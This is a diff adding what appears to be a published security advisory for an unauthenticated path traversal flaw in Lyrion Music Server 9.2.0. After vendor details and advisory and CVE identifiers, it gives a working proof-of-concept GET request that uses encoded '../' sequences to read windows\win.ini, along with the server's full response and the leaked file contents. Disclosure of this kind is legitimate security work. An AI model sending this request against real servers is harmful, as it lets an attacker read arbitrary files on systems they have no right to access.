@@ -1,0 +1,70 @@
+
+Lyrion Music Server 9.2.0 Path Traversal File Read
+
+
+Vendor: LMS Community
+Product web page: https://www.lyrion.org
+Affected version 9.2.0
+
+Summary: Lyrion Music Server (formerly Logitech Media Server, and
+often abbreviated as "LMS" ) is open-source software which can control
+and serve (stream) music to a wide range of physical and virtual audio
+players called Squeezeboxes. Lyrion Music Server can stream your local
+music collection, internet radio stations, and content from many streaming
+services (with and without subscriptions).
+
+Desc: The server suffers from a directory traversal vulnerability. Exploiting
+this issue will allow an unauthenticated attacker to view arbitrary files
+within the context of the web server.
+
+Tested on: Windows 10 (64-bit) - EN
+           Lyrion Music Server (9.2.0 - 1779973211)
+           Perl/5.32.1
+           SQLite
+
+
+Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+                            @zeroscience
+
+
+Advisory ID: ZSL-2026-5992
+Advisory URL: https://www.zeroscience.mk/#/advisories/ZSL-2026-5992
+CVE ID: CVE-2026-50234
+CVE URL: https://www.cve.org/CVERecord?id=CVE-2026-50234
+
+
+27.05.2026
+
+--
+
+
+GET /html/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows\win.ini HTTP/1.1
+Host: localhost:9000
+
+HTTP/1.1 200 OK
+Server: Lyrion Music Server (9.2.0 - 1779973211)
+Cache-Control: max-age=604800
+Connection: close
+Date: Fri, 29 May 2026 21:25:22 GMT
+Content-Length: 134
+Content-Type: text/html; charset=utf-8
+Expires: Fri, 05 Jun 2026 21:25:22 GMT
+Set-Cookie: Squeezebox-albumView=; path=/
+Set-Cookie: Squeezebox-expandPlayerControl=; path=/
+Set-Cookie: Squeezebox-expanded-MY_MUSIC=; path=/
+Set-Cookie: Squeezebox-expanded-FAVORITES=; path=/
+Set-Cookie: Squeezebox-expanded-PLUGINS=; path=/
+Set-Cookie: Squeezebox-expanded-PLUGIN_MY_APPS_MODULE_NAME=; path=/
+Set-Cookie: Squeezebox-expanded-RADIO=; path=/
+X-Time-To-Serve: 0.0615050792694092
+
+; for 16-bit app support
+[fonts]
+[extensions]
+[mci extensions]
+[files]
+[Mail]
+MAPI=1
+[WN3000]
+MachName=Mach0001
+MachId=0001
